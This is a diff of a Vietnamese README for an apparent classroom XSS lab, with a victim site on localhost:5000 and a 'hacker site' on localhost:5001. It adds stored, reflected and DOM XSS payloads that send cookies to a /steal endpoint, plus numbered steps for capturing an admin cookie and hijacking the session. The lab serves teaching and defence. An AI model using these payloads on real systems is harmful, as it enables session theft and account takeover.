@@ -123,27 +123,63 @@ python app.py --secure
 
 ## 6) Payload XSS de demo
 
-Chen vao comment tren victim site:
+Demo Stored
 
 ```html
 <script>
 new Image().src='http://127.0.0.1:5001/steal?cookie='+encodeURIComponent(document.cookie);
 </script>
 ```
+Demo Reflected
 http://127.0.0.1:5000/?search=%3Cscript%3E+new+Image%28%29.src%3D%27http%3A%2F%2F127.0.0.1%3A5001%2Fsteal%3Fcookie%3D%27%2BencodeURIComponent%28document.cookie%29%3B+%3C%2Fscript%3E
 
-http://127.0.0.1:5000/profile#%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2F127.0.0.1%3A5001%2Fsteal%3Ftoken%3D%27%2Bdocument.getElementById%28%27demoToken%27%29.innerText%29%22%3E
+Demo DOM
+http://127.0.0.1:5000/profile#%3Cimg%20src=x%20onerror=%22fetch('http://127.0.0.1:5001/steal?cookie='+encodeURIComponent(document.cookie))%22%3E
+
 ## 7) Quy trinh demo
 
-1. Mo hacker site tren localhost:5001.
-2. Dang nhap user thuong tren victim site.
-3. Chen payload vao comment.
-4. Dang nhap admin o tab khac.
-5. Admin mo trang /admin.
-6. Payload chay tren trinh duyet admin va gui cookie sang hacker site.
-7. Kiem tra log o hacker dashboard hoac file hacker_cookies.txt.
-8. Dung cookie de mo phong session hijack.
-9. Chay secure mode de doi chieu cach fix.
+*Lưu ý: Trang hacker: hacker-site(localhost:5001), trang demo: victim-site(localhost:5000)
+http://127.0.0.1:5001/steal?cookie='+encodeURIComponent(document.cookie): Đây là API lấy cookie của phía server hacker(hacker-site/app.py)
+
+*Stored XSS( Hoàng Thanh)
+Link: Demo Stored
+
+```html
+<script>
+new Image().src='http://127.0.0.1:5001/steal?cookie='+encodeURIComponent(document.cookie);
+</script>
+```
+
+1. Mở trang hacker site trên localhost:5001.
+2. Mở trang demo (localhost:5000)
+3. Đăng ký và đăng nhập tren victim site(5000) ( đoạn này là hacker đăng ký giả mạo tài khoản người dùng)
+4. Ở trang demo khác(ẩn danh), đăng nhập với tài khoản admin (admin, admin123), show trang trang liên hệ xem cmt của user(ban đầu là 1 cmt dịch vụ tốt)
+5. Quay lại trang demo với role user, nhấn vào phần liên hệ
+6. Chen payload stored XSS vao comment và gửi (payload sẽ lưu vào trong database)
+7. Ở trang demo role admin, nhấn vào xem comment(lúc này sẽ thực thi câu lệnh script ở trong data payload)
+8. Đoạn script sẽ thực thi lấy cookies và gửi sang phía server của hacker(trang hacker) và lưu cookies vào file
+9. Vào file hacker_cookies.txt kiểm tra(dòng đầu là cookies của role user hacker giả danh, dòng cuối là cookie của admin)
+10. Hacker sử dụng cookies đó để đăng nhập phiên admin mà không cần tài khoản mật khẩu
+11. Từ đấy hacker có thể truy cập vào trang admin và đánh cắp cũng như kiểm soát được trang demo đó
+
+
+*Reflected XSS(Nhật quang)
+
+Link Demo Reflected
+http://127.0.0.1:5000/?search=%3Cscript%3E+new+Image%28%29.src%3D%27http%3A%2F%2F127.0.0.1%3A5001%2Fsteal%3Fcookie%3D%27%2BencodeURIComponent%28document.cookie%29%3B+%3C%2Fscript%3E
+
+
+1. Mở trang hacker site trên localhost:5001.
+2. Mở trang demo (localhost:5000)
+3. Đăng ký và đăng nhập tren victim site(5000) ( đoạn này là hacker đăng ký giả mạo tài khoản người dùng)
+4. Ở trang demo khác(ẩn danh), đăng nhập với tài khoản admin (admin, admin123), show trang trang tin nhắn xem tin nhắn của user(ban đầu chưa có tin nhắn gì)
+5. Quay lại trang demo với role user, nhấn vào phần message
+6. Chen payload(link) reflected XSS vao ô tin nhắn và gửi (link này là 1 url tìm kiếm của trang demo với localhost:5000/?search=...)
+7. Ở trang demo role admin, nhấn vào xem tin nhắn(sẽ thấy user gửi link)
+8. Admin nhấn vào link, lúc này link sẽ mở ra url có dạng localhost:5000/?search=... và ở sau phần search là một đoạn script sẽ được thực thi lệnh lấy cookie và gửi về phía server hacker
+9. Vào file hacker_cookies.txt kiểm tra(dòng có thời gian lúc bấm vào link cookie admin)
+10. Hacker sử dụng cookies đó để đăng nhập phiên admin mà không cần tài khoản mật khẩu
+11. Từ đấy hacker có thể truy cập vào trang admin và đánh cắp cũng như kiểm soát được trang demo đó
 
 ## 8) Route chinh
 
